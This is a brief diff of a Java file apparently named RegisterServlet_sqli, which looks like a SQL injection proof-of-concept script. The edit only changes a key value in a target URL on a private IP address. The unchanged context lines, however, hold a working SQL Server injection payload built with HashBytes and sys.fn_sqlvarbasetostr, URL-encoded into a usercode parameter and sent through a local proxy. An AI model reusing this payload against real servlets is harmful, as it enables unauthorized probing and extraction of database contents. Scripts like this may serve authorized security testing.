@@ -15,7 +15,7 @@ public class RegisterServlet_sqli {
 
     public static void main(String[] args) throws Exception {
 
-        String url = "http://10.58.120.201:8088/servlet/RegisterServlet?key=caofalin_key&usercode=";
+        String url = "http://10.58.120.201:8088/servlet/RegisterServlet?key=test_key&usercode=";
         String params = URLEncoder.encode("1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--");
 
         HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
